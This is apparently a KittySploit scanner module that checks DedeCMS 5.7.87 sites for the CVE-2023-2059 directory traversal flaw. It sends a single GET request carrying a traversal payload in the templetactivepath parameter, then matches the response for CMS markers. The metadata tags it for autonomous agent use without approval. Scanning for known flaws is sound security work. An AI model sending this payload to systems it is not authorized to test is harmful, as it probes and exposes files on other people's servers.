#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Directory traversal vulnerability in DedeCMS 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'DedeCMS 5.7.87 - Directory Traversal Detection',
        'description': 'Directory traversal vulnerability in DedeCMS 5.7.87 allows reading sensitive files via the $activepath parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'dedecms', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/ATZXC-RedTeam/cve/blob/main/dedecms.md',
            'https://vuldb.com/?ctiid.225944',
            'https://vuldb.com/?id.225944',
        ],
        'cve': 'CVE-2023-2059',
    }

    def run(self):
        path = '/include/dialog/select_templets.php?f=form1.templetactivepath=%2ftemplets/../..\\..\\..\\'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        body_all = ('dirname(__file__)', '$cfg_basedir', 'dedecms',)
        if all(m in body for m in body_all):
            self.set_info(severity='medium', reason='DedeCMS 5.7.87 - Directory Traversal detected', path=path)
            return True
        return False

